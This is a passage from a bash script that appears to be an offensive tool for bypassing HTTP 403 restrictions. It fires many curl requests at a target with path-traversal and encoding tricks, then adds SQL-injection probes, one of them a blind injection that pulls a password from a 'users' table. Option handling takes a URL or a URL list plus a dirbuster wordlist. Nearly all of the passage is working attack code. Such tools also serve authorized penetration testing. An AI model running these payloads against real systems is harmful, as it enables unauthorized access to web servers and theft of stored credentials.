  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};///.." -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target};///..' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};///../" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target};///../' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};///..//" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target};///..//' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};x" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target};x' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};x/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target};x/' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};x;" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target};x;' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}&" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}&' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}%" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}%%%%' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}%09" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}%%%%09' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}../" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}../' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}..%2f" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}..%%%%2f' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}.././" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}.././' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}..%00/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}..%%%%00/' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}..%0d/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}..%%%%0d/' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}..%5c" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}..%%%%5c' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}..\\" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}..\\\\\\\\\\\\\\\' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}..%ff" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}..%%%%ff' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}%2e%2e%2f" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}%%%%2e%%%%2e%%%%2f' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}.%2e/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}.%%%%2e/' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}%3f" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}%%%%3f' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}%26" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}%%%%26' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}%23" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}%%%%23' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}%2e" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}%%%%2e' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/." -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}/.' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}?" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}?' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}??" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}??' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}???" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}???' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}//" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}//' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/./" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}/./' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}.//./" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}.//./' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}//?anything" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}//?anything' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}#" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}#' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}/' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/.randomstring" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}/.randomstring' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}..;/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}..;/' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}.html" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}.html' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}%20/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}%%%%20/' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/%20${path}%20/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}/%%%%20${path}%%%%20/' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}.json" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}.json' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}\..\.\\" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}\..\.\\\\\\\\\\\\\\\' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/*" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}/*' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}./." -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}./.' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/*/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}/*/' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/..;/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}/..;/' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/%2e/${path}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}/%%%%2e/${path}' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/%2e/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}/%%%%2e/' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}//." -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}//.' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}////" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}////' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/../" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}/../' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/;${path}/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}/;${path}/' -H 'User-Agent: Mozilla/5.0'")
  fun_print

  
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/'%20or%201.e(%22)%3D'" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}/'%%%%20or%%%%201.e(%%%%22)%%%%3D' -H 'User-Agent: Mozilla/5.0'")
  fun_print

  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/1.e(ascii" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}/1.e(ascii' -H 'User-Agent: Mozilla/5.0'")
  fun_print

  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/1.e(substring(" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}/1.e(substring(' -H 'User-Agent: Mozilla/5.0'")
  fun_print

  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/1.e(ascii%201.e(substring(1.e(select%20password%20from%20users%20limit%201%201.e%2C1%201.e)%201.e%2C1%201.e%2C1%201.e)1.e)1.e)%20%3D%2070%20or'1'%3D'2'" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}/1.e(ascii%%%%201.e(substring(1.e(select%%%%20password%%%%20from%%%%20users%%%%20limit%%%%201%%%%201.e%%%%2C1%%%%201.e)%%%%201.e%%%%2C1%%%%201.e%%%%2C1%%%%201.e)1.e)1.e)%%%%20%%%%3D%%%%2070%%%%20or'1'%%%%3D'2' -H 'User-Agent: Mozilla/5.0'")
  fun_print


}





#-----------------------------------------------------------------#

#-----------------------------------------------------------------#


if [ "$1" = '-l' ] || [ "$1" = '--list' ] 
then  
  if [ "$3" = '-w' ] || [ "$3" = '--wordlist' ] || [ "$3" = '-W' ]
  then
    banner
    wordlist="$4"
    echo -e "$(fun_info) WORDLIST:- $wordlist"    
  else
    banner
    wordlist="/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt"
    echo -e "$(fun_init) No Wordlist provided, using default wordlist"
    echo -e "$(fun_info) DEFAULT WORDLIST:- $wordlist"
  fi
  input=$2
  fun_get403
  fun_fromList
  exit 

elif [ "$3" = '--list' ] || [ "$3" = '-l' ]
then
  if [ "$1" = '-w' ] || [ "$1" = '--wordlist' ] || [ "$1" = '-W' ]
  then
    banner
    echo -e "\n"
    echo -e "\n"
    wordlist="$2"
    echo -e "$(fun_info) WORDLIST:- $wordlist"    
  else
    banner
    echo -e "\n"
    echo -e "\n"
    wordlist="/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt"
    echo -e "$(fun_init) No Wordlist provided, using default wordlist"
    echo -e "$(fun_info) DEFAULT WORDLIST:- $wordlist"
  fi
  input=$2
  fun_get403
  fun_fromList
  exit    

elif [ "$1" = '--url' ] || [ "$1" = '-u' ] || [ "$1" = '-U' ]
then
  banner
  echo -e "\n"
  echo -e "\n"
  target=$2
  fun_bypass
  exit

elif [ "$1" = '--help' ] || [ "$1" = '-h' ] || [ "$1" = '-H' ]
then
  banner
  fun_openHelp
  exit  

else
  banner
  echo "Unknown Option :("
  echo "opening help menu for you"
  echo -e "\n"
  fun_openHelp
  exit

fi




